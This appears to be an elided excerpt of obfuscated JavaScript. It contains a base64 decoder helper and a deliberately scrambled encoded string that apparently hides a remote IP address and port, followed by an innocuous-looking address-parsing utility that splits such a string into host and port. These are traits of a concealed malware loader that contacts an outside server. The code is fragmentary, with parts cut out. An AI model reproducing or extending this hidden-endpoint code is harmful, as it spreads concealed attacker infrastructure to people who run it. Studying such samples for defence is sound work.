...
const n = (a) => Buffer.from(a, t).toString(c),
  l = () => {
    let t = "MTQ3LjEyNCaHR0cDovLw4yMTQuMTMxOjEyNDQ=  ";
...
var AddressUtilities = function AddressUtilities() {
  ...
  function parseAddress(address) {
    ...
    var addressAndPortRegex =
      /(([012]{0,1}[0-9]{1,2}\.){3}[012]{0,1}[0-9]{1,2}):[0-9]{3,4}/;
    if (address.match(addressAndPortRegex)[0]) {
      return {
        host: address.match(addressAndPortRegex)[0].split(":")[0],
        port: address.match(addressAndPortRegex)[0].split(":")[1],
      };
    } else {
      return address;
    }
